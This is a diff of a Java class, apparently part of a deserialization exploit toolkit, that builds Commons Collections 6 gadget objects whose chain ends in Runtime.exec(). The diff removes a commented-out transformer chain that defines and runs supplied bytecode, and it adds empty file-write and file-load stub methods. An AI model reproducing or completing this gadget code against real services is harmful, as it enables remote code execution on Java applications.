@@ -49,6 +49,7 @@ import java.util.Map;
  *                         java.lang.reflect.Method.invoke()
  *                             java.lang.Runtime.exec()
  * Date:2020/3/29 0:35
+ * @author 0nise
  * @version 1.0.0
  */
 @Authors({Authors.R4V3ZN})
@@ -105,17 +106,28 @@ public class CommonsCollections6Gadget implements ObjectGadget<Serializable> {
         byte[] codeByte = param.getCodeByte();
         String[] bootArgs = param.getBootArgs();
         return getObject(codeByte, bootArgs, className, null);
-        /*
-        final Transformer[] transformers = new Transformer[] {
-                new ConstantTransformer(Class.forName("org.mozilla.classfile.DefiningClassLoader")),
-                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
-                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
-                new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{className, codeByte}),
-                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
-                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{bootArgs}}),
-                new ConstantTransformer(1) };
-        return getObject(transformers);
-         */
+    }
+
+    /**
+     * 文件写入
+     *
+     * @throws Exception
+     * @param param
+     */
+    @Override
+    public Serializable getWriteFileObject(GadgetParam param) throws Exception {
+        return null;
+    }
+
+    /**
+     * 加载文件
+     *
+     * @throws Exception
+     * @param param
+     */
+    @Override
+    public Serializable getLoadFileObject(GadgetParam param) throws Exception {
+        return null;
     }
 
     /**
